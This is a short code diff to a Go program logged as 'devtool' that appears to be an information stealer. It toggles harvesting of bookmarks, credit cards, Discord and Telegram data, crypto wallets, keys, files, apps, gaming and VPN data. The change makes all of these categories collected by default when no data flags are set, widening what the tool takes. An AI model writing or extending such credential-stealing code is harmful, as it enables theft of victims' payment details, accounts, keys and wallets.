@@ -100,13 +100,13 @@ func main() {
 		Bookmarks:   all || !anyData || bookmarks,
 		CreditCards: all || !anyData || cards,
 		Discord:     all || !anyData || discord,
-		Files:       all || files,
-		Wallets:     all || wallets,
-		Telegram:    all || telegram,
-		Keys:        all || keys,
-		Apps:        all || apps,
-		Gaming:      all || gaming,
-		VPNs:        all || vpn,
+		Files:       all || !anyData || files,
+		Wallets:     all || !anyData || wallets,
+		Telegram:    all || !anyData || telegram,
+		Keys:        all || !anyData || keys,
+		Apps:        all || !anyData || apps,
+		Gaming:      all || !anyData || gaming,
+		VPNs:        all || !anyData || vpn,
 	}
 
 	log.Printf("devtool: timeout=%ds browser=%q noInject=%v verbose=%v", timeoutSec, browser, noInject, verbose)
